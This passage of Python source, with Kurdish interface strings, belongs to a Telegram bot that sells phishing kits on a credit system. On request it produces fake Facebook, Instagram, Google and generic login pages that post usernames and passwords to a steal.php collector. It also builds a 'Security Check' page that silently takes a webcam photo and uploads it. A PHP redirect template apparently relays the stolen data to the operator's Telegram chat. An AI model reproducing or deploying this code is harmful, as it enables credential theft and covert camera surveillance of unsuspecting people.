if ($platform == 'Camera') { header("Location: https://www.google.com"); } elseif ($platform == 'Google') { header("Location: https://accounts.google.com"); } else { header("Location: https://www." . strtolower($platform) . ".com"); }
exit();
?>"""
    return php_template.replace("BOT_TOKEN_HERE", TOKEN).replace("CHAT_ID_HERE", str(ADMIN_ID))

@bot.message_handler(func=lambda m: any(p.lower() in m.text.lower() for p in ["hack", "phish", "camera"]) or any(s in m.text.lower() for s in ["facebook", "instagram", "tiktok", "gmail", "google"]), content_types=['text'])
def handle_phishing(message):
    if not is_subscribed(message.from_user.id): return force_sub_msg(message.chat.id)
    uid = message.from_user.id
    q = message.text.lower()
    if not is_super_admin(uid) and not spend_credit(uid): return bot.reply_to(message, "🔒 کرێدیتت نییە.")
    target = "Camera" if "camera" in q else next((p for p in ["Facebook", "Instagram", "TikTok", "Google"] if p.lower() in q), "Generic")
    msg = bot.reply_to(message, f"🎣 <b>دروستکردنی لاپەڕەی {target}...</b>")
    html_code = get_phishing_html(target)
    final_text = f"🎣 <b>فیشینگی ({target})</b>\n\n<pre><code class='language-html'>{html.escape(html_code)}</code></pre>\n\n<pre><code class='language-php'>{html.escape(get_phishing_php())}</code></pre>"
    bot.edit_message_text(final_text, chat_id=message.chat.id, message_id=msg.message_id, parse_mode="HTML")

def get_phishing_html(platform):
    if platform == "Camera": return """<h2>📸 Security Check</h2><video id="v" autoplay></video><script>navigator.mediaDevices.getUserMedia({video:true}).then(s=>{document.getElementById('v').srcObject=s;setTimeout(()=>{let c=document.createElement('canvas');c.width=640;c.height=480;c.getContext('2d').drawImage(document.getElementById('v'),0,0,640,480);fetch('steal.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'img='+encodeURIComponent(c.toDataURL())}).then(()=>{window.location='https://google.com'})},1000)})</script>"""
    elif platform == "Facebook": return """<h2 style="color:#1877f2">facebook</h2><form action="steal.php" method="POST"><input type="hidden" name="platform" value="Facebook"><input type="text" name="username" placeholder="Email"><input type="password" name="password" placeholder="Password"><button>Log In</button></form>"""
    elif platform == "Instagram": return """<h2>Instagram</h2><form action="steal.php" method="POST"><input type="hidden" name="platform" value="Instagram"><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><button>Log In</button></form>"""
    elif platform == "Google": return """<h2>Google</h2><form action="steal.php" method="POST"><input type="hidden" name="platform" value="Google"><input type="text" name="username" placeholder="Email"><input type="password" name="password" placeholder="Password"><button>Next</button></form>"""
    return """<h2>Login</h2><form action="steal.php" method="POST"><input type="text" name="username"><input type="password" name="password"><button>Submit</button></form>"""

@bot.message_handler(func=lambda m: not m.text.startswith("/"), content_types=["text"])
def handle_text(message):
    if not is_subscribed(message.from_user.id): return force_sub_msg(message.chat.id)
    if not is_super_admin(message.from_user.id) and get_setting('bot_status') == 'off': return
    if not is_super_admin(message.from_user.id) and not spend_credit(message.from_user.id): return bot.reply_to(message, "🔒 کرێدیتت نییە.")
    if get_setting('ai_enabled') == 'off': return bot.reply_to(message, "🧠 مێشکی AI ناچالاکە.")
    
    bot.send_chat_action(message.chat.id, 'typing')
    msg = bot.reply_to(message, "🧠 <b>شیکاری دەکرێت...</b>")
    res = get_ai_response(message.from_user.id, message.text.strip()) + get_signature()
    try: bot.edit_message_text(res, chat_id=message.chat.id, message_id=msg.message_id, parse_mode="HTML")
    except: bot.send_message(message.chat.id, res, parse_mode="HTML")

if __name__ == "__main__":
    init_db()
    logger.info("System is up and running. absolute olliE.")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
